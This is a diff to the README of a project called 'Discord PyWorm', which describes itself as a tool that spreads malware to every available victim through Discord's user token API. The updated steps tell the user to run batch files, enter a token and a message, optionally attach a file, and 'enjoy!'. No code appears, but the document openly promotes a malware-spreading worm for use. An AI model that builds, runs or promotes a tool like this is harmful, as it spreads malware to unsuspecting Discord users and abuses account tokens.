@@ -1,11 +1,10 @@
 # Discord PyWorm
 Spread malware to all available victims using discords user token api.
 
-# NOTE: pip install tkinter 
-Install tkinter before running the script.
-
 # How to run
-1. install tkinter
-2. Run the bash script
-3. input your token and message
-4. enjoy!
+1. Run prerequsites.bat
+2. Run run.bat
+3. Input your token
+4. Input your message
+5. choose whether you want to send a file
+6. enjoy!
